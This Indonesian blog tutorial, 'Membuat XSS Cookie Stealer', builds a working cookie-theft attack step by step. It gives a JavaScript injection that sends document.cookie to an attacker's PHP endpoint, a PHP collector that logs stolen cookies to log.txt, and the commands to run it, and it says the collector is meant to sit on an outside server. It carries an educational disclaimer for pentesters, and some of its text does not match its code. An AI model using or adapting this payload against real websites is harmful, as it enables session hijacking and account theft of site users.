---
title: "Membuat XSS Cookie Stealer"
date: "2019-01-10"
tags: ['Security']
---

**Membuat XSS Cookie Stealer** - JavaScript adalah salah satu bahasa yang paling umum digunakan di web. Dapat juga menganimasikan komponen situs web, mengelola konten situs web, dan menjalankan banyak fungsi bermanfaat lainnya dari dalam halaman web. Javascript memiliki banyak fungsi yang dapat digunakan untuk tujuan jahat, termasuk mencuri cookie pengguna dan informasi lainnya.

**Cookie adalah informasi yang diminta atau dipertahankan oleh situs web mengenai pengguna tertentu yang mengunjungi halaman tersebut**. Cookie berisi informasi tentang bagaimana dan kapan mereka mengunjungi, serta informasi otentikasi untuk situs seperti nama pengguna dan kata sandi. Karena cookie harus digunakan setiap kali pengunjung aktif di web, penyerang dapat mencuri informasi dan menggunakannya untuk meniru informasi pengguna.

Kita dapat menggunakan JavaScript untuk menyimpan atau memodifikasi cookie pengguna untuk domain tertentu. Serangan berbasis JavaScript sangat efektif bila dikombinasikan dengan taktik seperti injeksi kode. Karena memungkinkan kode berbahaya dijalankan di situs web yang tampaknya tepercaya.

Baca juga: [Upload Shell Menggunakan SQLMap](https://akbar.kustirama.id/upload-shell-menggunakan-sqlmap/).

Saya tidak menganjurkan untuk mencuri kata sandi siapa pun. Panduan ini adalah topik yang harus diketahui oleh pentester atau profesional keamanan TI apa pun untuk dipahami. Jika kalian tidak tahu bagaimana peretas _blackhat_ melakukan berbagai hal, kalian tidak akan pernah bisa menangkapnya.

### Membuat Halaman HTML Sebagai Tester  

Untuk mencuri cookie, cookie harus terlebih dahulu tersedia di domain web yang dilihat pengguna. Ini terjadi setiap kali pengguna melihat situs web.

Lingkungan pengujian untuk cookie saya akan berada dalam halaman HTML yang cukup standar. Saya akan dapat menanamkan semua elemen JavaScript kami secara langsung. Pertama, buat direktori baru untuk memuat file HTML. Pada sistem Linux atau macOS, kita dapat menggunakan mkdir, seperti yang terlihat di bawah ini.

```
mkdir cookiestealer
cd cookiestealer
touch index.html
```

Kita dapat membuat parameter dasar yang dimasukkan dalam cookie dengan hanya menggunakan satu string. Cookie ini hanya akan ada di halaman ini, dan sama halnya, teknik yang digunakan untuk membuang cookie nantinya. Ini hanya akan berlaku untuk cookie apa pun yang disimpan di dalam halaman tempat script dijalankan atau disuntikkan. Letakkan script di bawah ini di dalam tag `<body>...</body>`:

```
document.cookie = "username=abaykandotcom";
```

Untuk mengetahui apakah script kita bekerja, masukkan script berikut:

```

document.cookie = "username=abaykandotcom";
document.write(document.cookie);
```

Kita telah berhasil menetapkan "**username = abaykandotcom**" sebagai cookie untuk halaman ini. Kita sekarang dapat menghapus "**document.write (document.cookie);**", karena kita akan meneruskan cookie yang diambil dari halaman pengguna yang ditargetkan ke halaman independen. Yang di luar situs di mana mereka dapat ditulis dan disimpan.

### Membuat XSS Cookie-Stealer Menggunakan Javascript

```
document.location = 'http://127.0.0.1/cookiestealer.php? c =' + document.cookie;
```

Dalam contoh ini, file PHP terletak di komputer lokal, atau localhost, di 127.0.0.1. Dalam penerapan teknik ini, kita mengarah ke file yang di-host di server web di luar jaringan lokal atau komputer lokal.

Untuk tujuan pengujian, kita akan dapat meng-host file secara lokal menggunakan PHP. Kita dapat menyertakan JavaScript ini dalam tag skrip, seperti yang terlihat di bawah ini. Pada halaman HTML yang sama di mana saya mendefinisikan cookie yang saya buat tadi.

```

document.location='http://127.0.0.1:666/cookiestealer.php?c='+document.cookie;
```

Keseluruhan file akan menjadi seperti ini,

```

abay



document.cookie = "username=abaykandotcom";


document.location='http://127.0.0.1:666/cookiestealer.php?c='+document.cookie;


```

### Memproses Cookie Menggunakan PHP

Pertama, buat file PHP baru di direktori yang sama dengan file index.html. Lalu masukkan script dibawah ini ke dalam **cookiestealer.php**

Dengan melakukan redirection pada pengguna yang ditetapkan, kita dapat menambahkan kode tambahan untuk memproses cookie. Pertama, saya akan menetapkan cookie yang dibawa oleh URL ke variabel.

```
$cookies = $_GET["c"];
```

Selanjutnya, kita akan mendefinisikan file yang akan disimpan cookie pada server yang kita kontrol. Dalam contoh di bawah ini, file tersebut bernama "**log.txt**".

```
$file = fopen('log.txt', 'a');
```

Terakhir, saya akan menggabungkan variabel yang didefinisikan dalam dua string di atas. Ini dilakukan untuk menulis konten variabel, cookie, ke file log saya.

```
fwrite($file, $cookies . "\n\n");
```

Kode kita sekarang menjadi seperti dibawah ini.

### Menjalankan Cookie Stealer  

Dari dalam direktori yang sama dengan file index.html dan cookiestealer.php, kita dapat meluncurkan server pengujian. Kita hanya perlu menggunakan PHP dari Command Line.

```
abay@codelatte:~$ php -S 127.0.0.1:80
abay@codelatte:~$ sudo php -S 127.0.0.1:80
PHP 5.5.38 Development Server started at Tue Nov 27 21:38:12 2018
Listening on http://127.0.0.1:80
Document root is /Applications/XAMPP/xamppfiles/htdocs/cookiestealer
Press Ctrl-C to quit.
```

Server pengujian ini sekarang memungkinkan kita untuk menguji halaman dengan hanya membuka "127.0.0.1" dalam browser web pada mesin yang sama. Setelah membuka halaman ini, browser akan segera mengarahkan ke situs web yang saya definisikan sebagai pengalihan, dalam hal ini Google.

Akhirnya, kita akan dapat mengambil cookie dengan memeriksa file "log.txt" yang sekarang ada di direktori situs. Jika log berisi cookie, dalam hal ini "username = abaykandotcom" maka kita telah berhasil mencuri cookie menggunakan JavaScript!

<script id="asciicast-213877" data-autoplay="true" src="https://asciinema.org/a/213877.js" async></script>

Saya harap kalian menikmati artikel tentang cara Membuat XSS Cookie-Stealer ini.
